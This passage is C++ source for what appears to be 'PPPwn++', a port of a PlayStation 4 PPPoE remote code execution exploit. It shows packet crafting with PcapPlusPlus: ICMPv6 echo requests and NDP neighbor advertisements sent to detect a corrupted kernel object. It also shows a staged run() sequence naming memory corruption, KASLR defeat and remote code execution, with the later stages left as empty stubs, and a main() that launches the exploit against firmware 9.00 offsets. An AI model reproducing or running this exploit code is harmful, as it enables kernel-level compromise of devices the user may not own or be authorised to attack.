                echoRequestPacket.addLayer(&ethLayer);
                echoRequestPacket.addLayer(&ipv6Layer);
                echoRequestPacket.addLayer(&echoRequestLayer);
                echoRequestPacket.computeCalculateFields();
                hexdump_verbose(echoRequestPacket);
                dev->sendPacket(&echoRequestPacket);
            }

            dev->startCaptureBlockingMode(
                    [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
                        pcpp::Packet parsedPacket(packet);
                        auto *corrupted = (bool *) cookie;
                        if (!parsedPacket.isPacketOfType(pcpp::ICMPv6)) return false;
                        auto *layer =
                                parsedPacket.getLayerOfType<pcpp::IcmpV6Layer>();
                        if (layer) {
                            if (layer->getMessageType() == pcpp::ICMPv6MessageType::ICMPv6_ECHO_REPLY) {
                                return true;
                            } else if (layer->getMessageType() ==
                                       pcpp::ICMPv6MessageType::ICMPv6_NEIGHBOR_SOLICITATION) {
                                *corrupted = true;
                                return true;
                            }
                        }
                        return false;
                    }, &corrupted, 0);

            if (corrupted) break;

            {
                pcpp::EthLayer ethLayer(this->source_mac, this->target_mac);
                pcpp::IPv6Layer ipv6Layer(pcpp::IPv6Address(sourceIpv6.str()), this->target_ipv6);
                ipv6Layer.getIPv6Header()->hopLimit = 0xFF;
                pcpp::NDPNeighborAdvertisementLayer ndpLayer(0,
                                                             pcpp::IPv6Address(sourceIpv6.str()),
                                                             this->source_mac, true, true, true);

                pcpp::Packet ndPacket;
                ndPacket.addLayer(&ethLayer);
                ndPacket.addLayer(&ipv6Layer);
                ndPacket.addLayer(&ndpLayer);
                ndPacket.computeCalculateFields();
                hexdump_verbose(ndPacket);
                dev->sendPacket(&ndPacket);
            }
        }

        if (!corrupted) {
            std::cerr << "\r[-] Scanning for corrupted object...failed. Please retry." << std::endl;
            exit(1);
        }

        std::cout << "\r[+] Scanning for corrupted object...found " << sourceIpv6.str() << std::endl;
    }

    void stage2() {

    }

    void stage3() {

    }

    void stage4() {

    }

    void run() {
        std::cout << std::endl << "[+] STAGE 0: Initialization" << std::endl;
        stage0();

        std::cout << std::endl << "[+] STAGE 1: Memory corruption" << std::endl;
        stage1();

        std::cout << std::endl << "[+] STAGE 2: KASLR defeat" << std::endl;
        stage2();

        std::cout << std::endl << "[+] STAGE 3: Remote code execution" << std::endl;
        stage3();

        std::cout << std::endl << "[+] STAGE 4: Arbitrary payload execution" << std::endl;
        stage4();
    }

private:
    pcpp::PcapLiveDevice *dev;
    uint64_t pppoe_softc{};
    pcpp::MacAddress target_mac, source_mac;
    pcpp::IPv6Address target_ipv6;
    OffsetsFirmware offs;
};

int main(int argc, char *argv[]) {
    std::cout << "[+] PPPwn++ - PlayStation 4 PPPoE RCE by theflow" << std::endl;
    std::cout << "[+] args: <interface>" << std::endl;

    std::cout << "[+] interfaces: " << std::endl;
    std::vector<pcpp::PcapLiveDevice*> devList = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDevicesList();
    for (pcpp::PcapLiveDevice* dev : devList) {
        std::cout << dev->getName() << " " << dev->getDesc() << std::endl;
    }
    std::cout << std::endl;

    // todo: add argument parsing
    std::string interfaceName;
    if (argc > 1) {
        interfaceName = argv[1];
    } else {
        std::cerr << "[-] No interface name provided." << std::endl;
        return 1;
    }

#ifdef _WIN32
    // todo run LcpEchoHandler
    Exploit exploit(OffsetsFirmware_900(), interfaceName);
    exploit.run();
#else
    pid_t pid = fork();
    if (pid < 0) {
        std::cerr << "[-] Cannot run LcpEchoHandler" << std::endl;
    } else if (pid == 0) {
        LcpEchoHandler lcp_echo_handler(interfaceName);
        lcp_echo_handler.start();
    } else {
        Exploit exploit(OffsetsFirmware_900(), interfaceName);
        exploit.run();
        kill(pid, SIGTERM);
    }
#endif
    return 0;
}
